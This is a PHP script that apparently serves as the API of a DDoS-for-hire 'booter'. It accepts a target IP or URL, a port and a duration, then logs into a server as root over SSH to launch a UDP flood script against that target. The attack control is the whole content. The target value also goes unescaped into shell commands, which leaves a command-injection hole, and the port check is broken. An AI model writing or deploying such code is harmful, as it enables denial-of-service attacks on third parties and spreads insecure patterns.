<?php
    include('Net/SSH2.php');

    $address = "IP"; // Your IP Server

    $serverPort = 22; // SSH Port (Default 22)
    
    $user = "root"; // User login your server
    
    $password = "password"; // Password login your server
    
    $Methods = array("udp", "stop"); //Array of methods

    $APIKey = "layer4api"; //Your API Key

    $target = $_GET["host"];
    $port = intval($_GET['port']);
    $duration = intval($_GET['time']);
    $method = $_GET["method"];

    $key = $_GET["key"];

    if (empty($target) | empty($port) | empty($duration) | empty($method)) //Checking the fields
    {
        die("Please verify all fields");
    }

    if (!is_numeric($port) || !is_numeric($duration)) 
    {
        die('Time and Port must be a number');
    }
  
    if (!filter_var($target, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) && !filter_var($target, FILTER_VALIDATE_URL)) //Validating target
    {
        die('Please insert a correct IP address(v4)/URL..');
    }

    if($port < 1 && $port > 65535) //Validating port
    {
        die("Port is invalid");
    }

    if ($duration < 1) //Validating time
    {
        die("Time is invalid");
    }

    if (!in_array($method, $Methods)) //Validating method
    {
        die("Method is invalid");
    }
    
    if ($key !== $APIKey) //Validating API Key
    { 
        die("Invalid API Key");
    }

    $connection = ssh2_connect($address, $serverPort);
    if(ssh2_auth_password($connection, $user, $password))
    {
        if($method == "udp"){if(ssh2_exec($connection, "screen -dm -S $target timeout $duration python udp.py $target $port $duration")){echo "Attack sent to $target for $duration seconds using $method!";}else{die("Ran into a error");}}  
        if($method == "stop"){if(ssh2_exec($connection, "pkill -f $target")){echo "Attack stopped on $target!";}else{die("Ran into a error");}}      
    }
    else
    {
        die("Connection to server failed.");
    }
?>